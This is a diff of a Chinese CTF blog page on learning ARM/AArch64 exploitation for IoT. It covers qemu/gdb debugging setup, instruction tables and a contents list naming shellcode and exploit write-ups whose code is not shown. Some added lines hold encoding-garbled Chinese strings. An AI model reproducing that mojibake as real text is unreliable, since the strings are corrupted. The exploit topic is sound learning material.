@@ -14,10 +14,10 @@
 
   
 
-  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
   
   <title>
-    arm合集 |
+    arm基础 |
     
     Hexo
   </title>
@@ -35,12 +35,12 @@
 
   
   
-    <meta name="description" content="从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录 会记录刷题记录和arm汇编指令集 感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐  环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 .&#x2F;pwn  调试分为直接调试">
+    <meta name="description" content="从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录  会记录刷题记录和arm汇编指令集  感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐   环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 .&#x2F;pwn  调试分为直">
 <meta property="og:type" content="article">
-<meta property="og:title" content="arm合集">
+<meta property="og:title" content="arm基础">
 <meta property="og:url" content="https://khighl.github.io.git/2025/05/29/arm%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录 会记录刷题记录和arm汇编指令集 感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐  环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 .&#x2F;pwn  调试分为直接调试">
+<meta property="og:description" content="从0开始的iot学习记录-arm篇前言 这篇博客会持续更新,作为我入坑iot的异架构学习记录  会记录刷题记录和arm汇编指令集  感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐   环境配置和启动,调试配置环境主要需要的是gdbserver,gdb-multiarch和qemu可以参考孤鸿师傅的博客配置:Blog 启动,调试启动直接使用 1qemu-aarch64 .&#x2F;pwn  调试分为直">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://khighl.github.io.git/images/arm/1748512358538.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/arm/1748512444938.png">
@@ -59,11 +59,8 @@
 <meta property="og:image" content="https://khighl.github.io.git/images/arm/1748844231015.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/arm/1748844384129.png">
 <meta property="article:published_time" content="2025-05-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-06-02T08:42:56.406Z">
+<meta property="article:modified_time" content="2026-03-24T01:55:12.647Z">
 <meta property="article:author" content="zer00ne">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="iot">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://khighl.github.io.git/images/arm/1748512358538.png">
   
@@ -110,7 +107,7 @@
           </svg>
         
       </div>
-      <div class="loading-word">少女祈祷中...</div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
     </div>
   </div>
   </div>
@@ -197,7 +194,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="arm合集">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="arm基础">
         
       
     
@@ -208,7 +205,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">arm合集</h1>
+            <h1 data-aos="slide-up">arm基础</h1>
           </a>
         
       
@@ -235,7 +232,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-arm%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">从0开始的iot学习记录-arm篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">环境配置和启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">直接调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">加载进程调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">汇编指令集介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AARCH64"><span class="toc-number">1.3.1.</span> <span class="toc-text">AARCH64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%AD%98%E5%82%A8"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">数据加载与存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">条件跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">系统调用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM"><span class="toc-number">1.3.2.</span> <span class="toc-text">ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%82%A8%E5%AD%98"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">数据加载与储存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%B5%81%E6%8E%A7%E5%88%B6"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">指令流控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">栈操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0"><span class="toc-number">1.4.</span> <span class="toc-text">题目练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-arm"><span class="toc-number">1.4.1.</span> <span class="toc-text">baby_arm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">简要分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8execve"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">调用execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw%E8%B0%83%E7%94%A8"><span class="toc-number">1.4.1.2.2.</span> <span class="toc-text">orw调用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97NX%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">对抗NX保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-buffer-overflow-basic"><span class="toc-number">1.4.2.</span> <span class="toc-text">stack_buffer_overflow_basic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">arm架构的shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#execve"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text">execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw"><span class="toc-number">1.4.2.1.2.</span> <span class="toc-text">orw</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-spraying"><span class="toc-number">1.4.3.</span> <span class="toc-text">stack_spraying</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typo"><span class="toc-number">1.4.4.</span> <span class="toc-text">typo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">判断溢出长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84iot%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-arm%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">从0开始的iot学习记录-arm篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%92%8C%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">环境配置和启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">启动,调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">直接调试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9B%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">加载进程调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.</span> <span class="toc-text">汇编指令集介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AARCH64"><span class="toc-number">1.3.1.</span> <span class="toc-text">AARCH64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%AD%98%E5%82%A8"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">数据加载与存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">条件跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">系统调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HINT%E4%BC%98%E5%8C%96%E6%8F%90%E7%A4%BA%EF%BC%88%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86%E5%99%A8%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">HINT优化提示（用于处理器）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM"><span class="toc-number">1.4.1.</span> <span class="toc-text">ARM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97-1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">运算</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%82%A8%E5%AD%98"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">数据加载与储存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E4%BB%A4%E6%B5%81%E6%8E%A7%E5%88%B6"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">指令流控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">栈操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0"><span class="toc-number">1.5.</span> <span class="toc-text">题目练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-arm"><span class="toc-number">1.5.1.</span> <span class="toc-text">baby_arm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">简要分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8execve"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text">调用execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw%E8%B0%83%E7%94%A8"><span class="toc-number">1.5.1.2.2.</span> <span class="toc-text">orw调用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97NX%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">对抗NX保护</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-buffer-overflow-basic"><span class="toc-number">1.5.2.</span> <span class="toc-text">stack_buffer_overflow_basic</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#arm%E6%9E%B6%E6%9E%84%E7%9A%84shellcode%E4%B9%A6%E5%86%99"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">arm架构的shellcode书写</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#execve"><span class="toc-number">1.5.2.1.1.</span> <span class="toc-text">execve</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#orw"><span class="toc-number">1.5.2.1.2.</span> <span class="toc-text">orw</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0restart-syscall"><span class="toc-number">1.6.</span> <span class="toc-text">0restart_syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2fork"><span class="toc-number">1.7.</span> <span class="toc-text">2fork</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-spraying"><span class="toc-number">1.7.1.</span> <span class="toc-text">stack_spraying</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typo"><span class="toc-number">1.7.2.</span> <span class="toc-text">typo</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">判断溢出长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -248,15 +245,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -325,11 +322,15 @@
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-05-28T16:00:00.000Z" itemprop="datePublished">2025-05-29</time>
-    <time style="display: none;" id="post-update-time">2025-06-02</time>
+    <time style="display: none;" id="post-update-time">2026-03-24</time>
   </span>
 </div>
 
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/" data-aos="zoom-in">ctf</a>
+  </div>
+
 
     </div>
     <div class="hr-line"></div>
@@ -339,15 +340,18 @@
       
       
         <h1 id="从0开始的iot学习记录-arm篇"><a href="#从0开始的iot学习记录-arm篇" class="headerlink" title="从0开始的iot学习记录-arm篇"></a>从0开始的iot学习记录-arm篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>这篇博客会持续更新,作为我入坑iot的异架构学习记录</li>
-<li>会记录刷题记录和arm汇编指令集</li>
-<li>感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导<del>和🍐</del></li>
+<li><p>这篇博客会持续更新,作为我入坑iot的异架构学习记录</p>
+</li>
+<li><p>会记录刷题记录和arm汇编指令集</p>
+</li>
+<li><p>感谢winmt师傅,孤鸿师傅和爱师傅的帮助指导和🍐</p>
+</li>
 </ul>
-<h2 id="环境配置和启动-调试"><a href="#环境配置和启动-调试" class="headerlink" title="环境配置和启动,调试"></a>环境配置和启动,调试</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a><strong>配置环境</strong></h3><p>主要需要的是gdbserver,gdb-multiarch和qemu<br>可以参考孤鸿师傅的博客配置:<a target="_blank" rel="noopener" href="https://zikh26.github.io/">Blog</a></p>
+<h2 id="环境配置和启动-调试"><a href="#环境配置和启动-调试" class="headerlink" title="环境配置和启动,调试"></a>环境配置和启动,调试</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>主要需要的是gdbserver,gdb-multiarch和qemu<br>可以参考孤鸿师傅的博客配置:<a target="_blank" rel="noopener" href="https://zikh26.github.io/">Blog</a></p>
 <h3 id="启动-调试"><a href="#启动-调试" class="headerlink" title="启动,调试"></a>启动,调试</h3><p>启动直接使用</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 ./pwn</span><br></pre></td></tr></table></figure>
 
-<p>调试分为<strong>直接调试</strong>和<strong>加载进程调试</strong></p>
+<p>调试分为直接调试和加载进程调试</p>
 <h4 id="直接调试"><a href="#直接调试" class="headerlink" title="直接调试"></a>直接调试</h4><p>在shell中输入</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-aarch64 -g 1234 ./pwn</span><br></pre></td></tr></table></figure>
 
@@ -366,440 +370,94 @@
 <p>在exp创建进程对象时使用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;4234&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br></pre></td></tr></table></figure>
 
-<p>然后运行exp时exp会被卡住,等待远程连接,此时重复<strong>直接调试的步骤</strong></p>
+<p>然后运行exp时exp会被卡住,等待远程连接,此时重复直接调试的步骤</p>
 <p><img src="/images/arm/1748512711933.png" alt="1748512711933"></p>
 <p>exp进程被卡住</p>
 <p><img src="/images/arm/1748512736753.png" alt="1748512736753"></p>
 <p>远程连接</p>
 <h2 id="汇编指令集介绍"><a href="#汇编指令集介绍" class="headerlink" title="汇编指令集介绍"></a>汇编指令集介绍</h2><p>这段会持续更新,直到把所有指令搞得差不多懂了(精简指令集这个应该不难吧)</p>
 <p>arm属于精简指令集,每条指令都是8&#x2F;4字节对齐</p>
-<h3 id="AARCH64"><a href="#AARCH64" class="headerlink" title="AARCH64"></a>AARCH64</h3><h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>MOV</code></td>
-<td>移动数据</td>
-<td><code>MOV X0, X1</code></td>
-<td>把<code>X1</code>的值赋给<code>X0</code>,<code>X1</code>还可以是<code>16</code>位<code>立即数</code></td>
-</tr>
-<tr>
-<td><code>ADD</code></td>
-<td>加法</td>
-<td><code>ADD X0, X1, X2</code></td>
-<td><code>X0 = X1 + X2</code></td>
-</tr>
-<tr>
-<td><code>SUB</code></td>
-<td>减法</td>
-<td><code>SUB X0, X1, X2</code></td>
-<td><code>X0 = X1 - X2</code></td>
-</tr>
-<tr>
-<td><code>MUL</code></td>
-<td>乘法</td>
-<td><code>MUL X0, X1, X2</code></td>
-<td><code>X0 = X1 * X2</code></td>
-</tr>
-<tr>
-<td><code>AND</code></td>
-<td>按位与</td>
-<td><code>AND X0, X1, X2</code></td>
-<td>位运算</td>
-</tr>
-<tr>
-<td><code>ORR</code></td>
-<td>按位或</td>
-<td><code>ORR X0, X1, X2</code></td>
-<td>位运算</td>
-</tr>
-<tr>
-<td><code>EOR</code></td>
-<td>异或</td>
-<td><code>EOR X0, X1, X2</code></td>
-<td>位运算</td>
-</tr>
-<tr>
-<td><code>LSL</code></td>
-<td>左移</td>
-<td><code>LSL X0, X1, #3</code></td>
-<td><code>X0 = X1 &lt;&lt; 3</code></td>
-</tr>
-<tr>
-<td><code>LSR</code></td>
-<td>右移</td>
-<td><code>LSR X0, X1, #2</code></td>
-<td><code>X0 = X1 &gt;&gt; 2</code></td>
-</tr>
-<tr>
-<td><code>CMP</code></td>
-<td>比较</td>
-<td><code>CMP X0, X1</code></td>
-<td>实际是<code>SUB</code>，不存结果，仅影响标志位</td>
-</tr>
-</tbody></table>
-<h4 id="数据加载与存储"><a href="#数据加载与存储" class="headerlink" title="数据加载与存储"></a>数据加载与存储</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>LDR</code></td>
-<td>加载</td>
-<td><code>LDR X0, [X1]</code></td>
-<td>从<code>X1</code>指向的地址读取值存入<code>X0</code></td>
-</tr>
-<tr>
-<td><code>STR</code></td>
-<td>存储</td>
-<td><code>STR X0, [X1]</code></td>
-<td>把<code>X0</code>的值写入<code>X1</code>指向的地址</td>
-</tr>
-<tr>
-<td><code>LDP</code></td>
-<td>成对加载</td>
-<td><code>LDP X0, X1, [SP]</code></td>
-<td>加载两个值</td>
-</tr>
-<tr>
-<td><code>STP</code></td>
-<td>成对存储</td>
-<td><code>STP X0, X1, [SP, #-16]!</code></td>
-<td>一次存两个，常用于保存栈帧</td>
-</tr>
-</tbody></table>
-<h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>示例</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>B</code></td>
-<td>无条件跳转</td>
-<td><code>B label</code></td>
-<td>跳转到 label</td>
-</tr>
-<tr>
-<td><code>BL</code></td>
-<td>跳转并链接</td>
-<td><code>BL func</code></td>
-<td>调用函数（保存返回地址到<code>X30</code>）</td>
-</tr>
-<tr>
-<td><code>BR</code></td>
-<td>跳转寄存器</td>
-<td><code>BR X30</code></td>
-<td>类似<code>RET</code></td>
-</tr>
-<tr>
-<td><code>RET</code></td>
-<td>返回,跳转到<code>X30</code></td>
-<td><code>RET</code></td>
-<td>相当于<code>BR X30</code></td>
-</tr>
-</tbody></table>
-<h4 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h4><p>配合<code>CMP</code>使用</p>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>含义</th>
-<th>条件</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>B.EQ</code>&#x2F;<code>BEQ</code></td>
-<td>相等</td>
-<td>Z&#x3D;1</td>
-<td><code>BEQ label</code></td>
-</tr>
-<tr>
-<td><code>B.NE</code>&#x2F;<code>BNE</code></td>
-<td>不相等</td>
-<td>Z&#x3D;0</td>
-<td><code>BNE label</code></td>
-</tr>
-<tr>
-<td><code>B.LT</code>&#x2F;<code>BLT</code></td>
-<td>小于</td>
-<td>N≠V</td>
-<td><code>BLT label</code></td>
-</tr>
-<tr>
-<td><code>B.LE</code>&#x2F;<code>BLE</code></td>
-<td>小于等于</td>
-<td>Z&#x3D;1 or N≠V</td>
-<td><code>BLE label</code></td>
-</tr>
-<tr>
-<td><code>B.GT</code>&#x2F;<code>BGT</code></td>
-<td>大于</td>
